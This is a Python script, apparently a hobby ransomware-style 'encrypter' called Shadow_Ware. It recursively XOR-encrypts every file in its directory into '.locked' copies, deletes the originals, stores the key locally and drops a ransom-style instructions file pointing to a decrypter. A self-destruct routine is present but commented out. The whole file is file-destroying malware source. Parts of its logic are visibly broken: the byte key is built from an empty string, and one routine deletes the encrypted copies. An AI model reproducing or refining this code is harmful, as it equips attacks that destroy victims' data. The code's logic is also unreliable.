#!/usr/bin/env python3
instructions = "https://github.com/PrestonDragon989/ShadowCrypt\n\nThe Decrypter can be found there, and run it next to all locked files to unlock them."

import base64, random, os, hashlib, hmac, string, time

""" Class for encrypter """
class Shadow_Ware():
  def __init__(self):
    self.ignored_files = ["Copyright Preston E.md"]

    # Keys and ID
    self.key = ''
    self.bytes_key = self.turn_to_bytes(self.key)

    # Current Dir
    self.current_dir = os.path.dirname(__file__)

    # Encryption Options
    self.get_new_key = True
    self.encrypt_delete_files = False
    self.skip_large_files = False
    self.ask_skip_large_files = True

  # Getting Options
  def get_options(self):
    print("==================================================")
    self.get_new_key = input("Enter \'y\' to use prexisting key: ")
    if self.get_new_key.lower() == 'y':
      self.get_new_key = False
    
    self.encrypt_delete_files = input("Enter \'y\' to encrypt, then immediately delete files: ")
    if self.encrypt_delete_files.lower() == 'y':
      self.encrypt_delete_files = True
    
    self.skip_large_files = input("Enter \'y\' to skip large files (20,000+ KB): ")
    if self.skip_large_files.lower() == 'y':
      self.skip_large_files = True

    self.ask_skip_large_files = input("Enter \'y\' to not ask to skip larg files: ")
    if self.ask_skip_large_files.lower() == "y":
      self.ask_skip_large_files = False
    print("==================================================")

  def get_key(self):
    key = ""
    with open("ID.id", "rb") as ID:
        key = base64.b64decode(ID.read())
    return key

  # Inital code to setup data used for encyrption
  def create_key(self):
    key = ""
    for _ in range(random.randint(15000, 20000)):
      key += str(random.randint(1, 99))
      key += random.choice(string.ascii_letters)
    return key

  def turn_to_bytes(self, string):
    return string.encode("utf-8")

  def create_id(self):
    with open("ID.id", "wb") as ID_file:
      ID_file.write(base64.b64encode(self.turn_to_bytes(self.key)))

  # Get all files 
  def get_file_in_dir(self, dir):
    files = []
    for file in os.listdir(dir):
      if file not in self.ignored_files:
        files.append(file)
    return files

  def get_dir_in_dir(self, dir):
    directories = []
    for root, dirs, files in os.walk(dir):
      for directory in dirs:
        if directory not in self.ignored_files:
          directories.append(directory)
    return directories

  def get_all_files(self, dir):
    all_files = []
    for root, dirs, files in os.walk(dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in self.ignored_files:
                all_files.append(file_path)
    return all_files

  # Encryption code
  def encrypt_file(self, input_file, output_file):
    try:
      with open(input_file, "rb") as file:
          data = file.read()
    except Exception as e:
      print("Failed to read " + input_file + " because " + str(e))

    try:
      encrypted_data = bytearray(len(data))
      for i in range(len(data)):
          encrypted_data[i] = data[i] ^ self.bytes_key[i % len(self.bytes_key)]
    except Exception as e:
      print("Failed to encrypt data of " + input_file + " because " + str(e))

    try:
      with open(output_file, "wb") as file:
          file.write(encrypted_data)
    except Exception as e:
      print("Failed to write encrypted data to " + output_file + " because " + str(e))

  # Encrypt All Files
  def encrypt_all_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath(__file__) and not file.endswith(".locked"):
        print("Locking file " + file)
        self.encrypt_file(file, file + ".locked")

  # Remove not locked files
  def remove_not_locked_files(self):
    files = self.get_all_files(self.current_dir)
    script_path = os.path.abspath(__file__)
    id_file_path = os.path.join(self.current_dir, "ID.id")
    decrypter_file_path = os.path.abspath("decrypter.py")
    for file in files:
        if (file not in self.ignored_files) and (not file.endswith(".locked")) and (file != script_path and file != id_file_path and file != decrypter_file_path):
            print("Removed " + file)
            os.remove(file)

  def encrypt_delete_all_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath(__file__) and not file.endswith(".locked"):
        print("Locking file " + file)
        self.encrypt_file(file, file + ".locked")
        if os.path.exists(os.path.abspath(file + ".locked")):
          print("Removing file " + file + ".locked")
          try:
            os.remove(os.path.abspath(file + ".locked"))
          except Exception as e:
            print(f"Failed to remove file {file}.locked becuase {str(e)}")

  def leave_instructions(self):
    with open("instructions.txt", "w") as file:
      file.write(instructions)

  def self_destruct(self):
    time.sleep(3)
    print("Encrypter: Self Destructing")
    try:
      os.remove(os.path.abspath(__file__ + ".locked"))
    except Exception as e:
      print("Failed to kill clone for " + str(e))
    os.remove(os.path.abspath(__file__))

  def operation_manager(self):
    # Key Management
    if self.get_new_key:
      self.key = self.create_key()
      self.create_id()
    else:
      try:
        self.key = self.get_key()
      except Exception as e:
        print(f"Couldn't retrieve key because {e}")
        self.key = self.create_key()
        self.create_id()

    if self.encrypt_delete_files:
      self.encrypt_delete_all_files()

    else:
      self.encrypt_all_files()
      self.remove_not_locked_files()


if __name__ == "__main__":
  shadow_ware = Shadow_Ware()
  shadow_ware.operation_manager()
  shadow_ware.leave_instructions()
  #shadow_ware.self_destruct()